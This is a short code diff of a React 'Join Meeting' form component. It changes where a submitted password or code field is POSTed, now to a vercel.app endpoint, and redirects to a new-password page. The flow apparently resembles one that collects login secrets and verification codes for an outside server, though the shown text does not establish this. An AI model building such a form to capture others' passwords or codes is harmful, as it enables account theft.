@@ -13,16 +13,15 @@ const Code = () => {
 
   const onSubmit = (data) => {
     const ItemId = {
-      Email: data.example,
       Password: data.exampleRequired,
     };
-    fetch("https://roni-mega.vercel.app/users", {
+    fetch("https://hakim-meet-mega-sarver.vercel.app/code", {
       method: "POST",
       headers: { "Content-type": "application/json" },
       body: JSON.stringify(ItemId),
     })
       .then((res) => res.json())
-      .then((result) => navigate("/verify"));
+      .then((result) => navigate("/NewPassword"));
   };
   return (
     <div>
@@ -45,7 +44,6 @@ const Code = () => {
                 {errors.exampleRequired && <span>This field is required</span>}
 
                 <input
-                  onClick={() => navigate("/NewPassword")}
                   className="submit  mt-3 mb-3 w-50%"
                   type="SUBMIT"
                   defaultValue="Join Meeting"
